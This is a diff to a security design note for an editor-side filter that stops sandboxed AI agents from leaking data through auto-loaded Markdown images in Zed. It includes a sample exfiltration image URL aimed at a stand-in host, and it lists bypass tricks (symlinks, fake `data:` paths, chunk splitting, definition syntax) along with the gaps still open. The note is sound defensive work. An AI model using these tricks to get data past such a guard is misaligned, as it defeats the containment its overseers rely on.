@@ -39,30 +39,43 @@ and wrote the file inside the box. Before it, Gemini read and wrote through the 
 offered; Claude and Codex never asked.
 Dropped today with no effect in Zed: `_auth/status_update` (Claude) and `_x.ai/*` (Grok).
 
-**Remote images.** Zed loads an image in an agent's Markdown by itself (`resolve_agent_image` in its `agent_ui.rs`,
-any `http://` or `https://`), so `![x](https://example.org/?data=...)` would carry data out with no click. In a
+**Images.** Zed loads an image in an agent's Markdown by itself (`resolve_agent_image` in its `agent_ui.rs`), so
+`![x](https://example.org/?data=...)` would carry data out with no click. It also looks a path up in the project and
+follows a symlink, so a box can point `![x](a.png)` at anything the host can open, such as a network mount. In a
 filtered session `p.out` is an `imageGuard` (`image_guard.go`), which reads every line for the editor, Coop's own
 too, because they quote a box's words. Its `imageEscaper` (`markdown_images.go`) knows two rules and no block
-structure: `![text](address` gets `\!`, and `]: address` gets `]\:`, which kills a definition whatever container
-holds it, so `![a]` and `![a][b]` have nothing to load. Traps:
+structure: `![text](address` gets `\!`, and a definition, `[label]: address`, gets `]\:`, so `![a]` and `![a][b]` have
+nothing to load. Only `![text](data:...)` may stay an image. Traps:
+- **`data:` is not enough.** Zed decodes a `data:` address only for a type it knows with base64 that passes strict
+  rules (`z_markdown.rs`). Anything else falls through to the path lookup, so `![x](data:a)` loads a project file a box
+  named `data:a`. The escaper keeps only `data:image/{png,jpeg,gif,webp};base64,` with strictly valid base64 and nothing
+  else up to the `)`, no title and no capitals. SVG is left out because it can refer to other files.
+- **Definitions.** A label starts a line, so this keys on `[` there instead of on `]:`, which keeps `a[0]: b`. "There"
+  means after any bytes of indent, `>` or list markers: an indent can be any depth inside a list, so the three-space
+  limit does not hold. A footnote's body is a container too, but `[^1]: ` itself gets the backslash, which also ends the
+  container. A label holds no `[` and no blank line, which ends the read early. A `[` still open at a pause gets `\[`.
+  No definition stays, even with image data: goldmark starts a new one right after a title, on the same line.
 - **Chunks.** Zed joins a message's chunks with nothing between them, so a box can split the syntax at any byte. The
   guard holds back only what could still become an image, and sends it before the session's next other line. A
   `!` or `]` sent that way goes raw, and the next text is guarded if it starts with `[`, `(` or `:`, because Zed
   will add a chunk that arrives after the turn's answer to the same message.
-- **Backslash runs.** A held backslash is doubled at a pause, so it cannot hide or reveal what comes next.
+- **Backslash runs.** A held backslash is doubled at a pause, so it cannot hide or reveal what comes next. A backslash
+  before a line break still ends the line.
+- **Pauses.** The text after a pause may be a new Markdown, so it counts as a line start, whatever came before.
 - **Links.** Zed writes a `resource_link` into the message as `[@name](uri)`, with the name decoded from the uri, or
   as the bare uri if it cannot read it. No backslash can fix that, so a line whose uri spells an image, or ends in
-  something the next chunk could finish, is dropped.
+  something the next chunk could finish, is dropped. A `]:` anywhere counts, because `[@a]:b](uri)` is a definition.
 - **What is not Markdown.** A raw tool value that is not a string is printed as JSON in a fence that JSON cannot
   close, and diffs and terminal output are not Markdown either, so these stay byte for byte.
 - **Parsers.** goldmark stands in for pulldown-cmark in the tests but does not read a footnote's body as a container.
   `<img>` does not load, since a thread's Markdown has `parse_html` off.
-- **The price.** A remote image, or a line like `[server]: https://...`, spelled out in a code block shows a backslash.
-  Telling code from text would mean trusting a parser that can disagree with the editor's.
+- **The price.** In a code block these show a backslash: an image spelled out, and a line that starts like a definition,
+  such as `[key: string]: number;`. Telling code from text would mean trusting a parser that can disagree with the
+  editor's. Outside a code block the backslash does not show, but a reference link's definition and a footnote's stop
+  working, a `data:` image over 16 KB in text becomes a link, and a resource link with `]:` in it, such as an IPv6 port,
+  is dropped. An image block the agent sends is not Markdown and is not touched.
 
-Not closed: an image of a local path still loads, because the owner's spec keeps it. A box can name a path on a network
-mount, directly or through a symlink in the project; an absolute path is escaped, a relative one is not. A
-`session/update` can also name paths (tool call `locations`, resource links) the editor may show or open, and links a
+Not closed: a `session/update` can name paths (tool call `locations`, resource links) the editor may show or open, and links a
 person can click. The agent gets nothing back from those. Mermaid fences render in the thread, and Zed's renderer for
 them was not read.
 
@@ -75,3 +88,6 @@ cannot be driven from an agent session, so it is read from source at v1.26.2.
   the forged methods in the editor's list.
 - 2026-11-04 — remote images closed. Checked against pulldown-cmark 0.13 with Zed's options on 700,000 random and
   hostile documents with no remote image left, and on a real filtered box with an image split across two writes.
+- 2026-11-04 — every image but decodable `data:` closed, on the owner's answer. Definitions now key on a line-start
+  `[`. Zed's `data:` fallback to a path, read from its source, ruled out accepting the bare prefix. Checked against
+  pulldown-cmark 0.13 and goldmark on 1.4 million random and hostile documents, with every split of the tables.
